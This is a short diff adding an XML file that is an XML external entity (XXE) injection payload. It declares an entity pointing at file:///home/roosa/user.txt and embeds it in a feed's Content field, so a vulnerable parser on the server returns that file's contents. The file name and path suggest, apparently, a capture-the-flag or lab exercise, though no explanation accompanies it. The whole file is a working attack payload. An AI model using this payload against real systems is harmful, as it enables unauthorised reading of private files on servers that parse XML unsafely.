@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///home/roosa/user.txt">
+]>
+<feed>
+    <Author>thegeeq</Author>
+    <Subject>thegeeq</Subject>
+    <Content>&xxe;</Content>
+</feed>
